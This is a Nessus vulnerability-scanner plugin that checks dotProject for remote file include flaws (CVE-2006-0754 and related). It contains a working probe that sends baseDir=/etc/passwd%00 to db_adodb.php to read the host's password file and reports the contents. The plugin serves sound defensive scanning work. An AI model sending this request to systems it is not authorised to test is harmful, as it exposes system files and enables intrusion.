#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple remote file include vulnerabilities. 

Description :

The remote host is running dotProject, a web-based, open-source,
project management application written in PHP. 

The installed version of dotProject fails to sanitize input to various
parameters and scripts before using it to include PHP code.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit these flaws to view arbitrary files on
the remote host or to execute arbitrary PHP code, possibly taken from
third-party hosts. 

See also :

http://www.securityfocus.com/archive/1/424957/30/0/threaded
http://milw0rm.com/exploits/2191
http://www.dotproject.net/vbulletin/showthread.php?t=4462
http://www.securityfocus.com/archive/1/425285/100/0/threaded

Solution :

Disable PHP's 'register_globals' setting as per the application's
installation instructions. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20925);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-0754", "CVE-2006-0755", "CVE-2006-4234");
  script_bugtraq_id(16648, 19547);

  script_name(english:"dotProject Remote File Include Vulnerabilities");
  script_summary(english:"Checks for remote file include vulnerabilities in dotProject");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/dotproject", "/dotProject", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit one of the flaws to read /etc/passwd.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/includes/db_adodb.php?",
      "baseDir=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/lib/adodb/adodb\.inc\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) 
      contents = res - strstr(res, "<br");

    if (isnull(contents) || !report_verbosity) report = desc;
    else {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '", file, "' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_warning(port:port, data:report);
    exit(0);
  }
}
